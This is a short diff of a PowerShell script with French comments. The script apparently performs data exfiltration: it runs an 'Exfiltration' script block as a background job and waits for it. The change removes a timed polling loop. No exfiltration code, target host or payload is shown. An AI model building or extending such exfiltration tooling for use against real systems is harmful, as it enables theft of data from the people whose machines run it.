@@ -119,13 +119,6 @@ function Exflitration {
     
 # Lancer la fonction Exfiltration en arrière-plan
 $ExfiltrationJob = Start-Job -ScriptBlock $ExfiltrationScript
-# Boucle principale
-do {
-    # Attendre une seconde avant de vérifier à nouveau
-    Start-Sleep -Seconds 1
-
-    # Vérifier si le délai est écoulé
-} until (Delai-ecoule)
 
 # Attendre que le job Exfiltration soit terminé
 Wait-Job $ExfiltrationJob | Out-Null
